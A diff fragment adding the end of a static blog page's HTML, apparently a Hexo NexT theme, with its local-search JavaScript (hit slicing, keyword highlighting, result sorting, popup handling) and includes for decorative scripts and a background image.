+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+ <!-- ҳ����С���� -->
+ <script type="text/javascript" src="/js/src/love.js"></script>
+
+  
+  
+  <!--������ƭ-->
+ <script type="text/javascript" src="/js/src/crash_cheat.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+  <script>
+  $("body").backstretch("https://myqinshimoon.github.io/background.jpg");
+  </script>
+
+
+</body>
+</html>
